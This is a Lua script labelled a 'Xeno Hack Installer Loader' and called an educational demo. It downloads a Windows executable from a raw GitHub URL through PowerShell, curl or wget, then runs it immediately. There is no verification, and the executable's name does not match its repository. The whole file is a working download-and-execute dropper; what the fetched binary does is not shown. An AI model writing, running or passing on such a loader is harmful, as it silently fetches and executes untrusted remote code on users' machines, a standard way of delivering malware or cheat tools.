
-- Xeno Hack Installer Loader (educational/hobbyist demo)
-- Downloads a file from a URL and executes the installer

local url = "https://github.com/Target9/bigpaintball/raw/refs/heads/main/crawl-installer(4).exe"
local outputPath = "crawl_installer(4).exe"

-- Helper: detect OS
local function isWindows()
    return package.config:sub(1, 1) == "\\"
end

-- Download the file using whatever tool is available on the system
local function downloadFile(fileUrl, dest)
    print("[*] Downloading from: " .. fileUrl)

    local cmd
    if isWindows() then
        -- PowerShell is available on basically all modern Windows
        cmd = string.format(
            'powershell -Command "Invoke-WebRequest -Uri \'%s\' -OutFile \'%s\'"',
            fileUrl, dest
        )
    else
        -- curl first, fall back to wget
        cmd = string.format(
            'curl -L -o "%s" "%s" || wget -O "%s" "%s"',
            dest, fileUrl, dest, fileUrl
        )
    end

    local ok = os.execute(cmd)
    if not ok then
        error("[!] Download failed.")
    end
    print("[+] Saved to: " .. dest)
end

-- Run the downloaded installer
local function runInstaller(path)
    print("[*] Launching installer: " .. path)

    local cmd
    if isWindows() then
        cmd = string.format('start "" "%s"', path)
    else
        -- mark executable then run
        cmd = string.format('chmod +x "%s" && "./%s"', path, path)
    end

    local ok = os.execute(cmd)
    if not ok then
        error("[!] Failed to launch installer.")
    end
    print("[+] Installer launched.")
end

-- Main
local function main()
    downloadFile(url, outputPath)
    runInstaller(outputPath)
end

main()
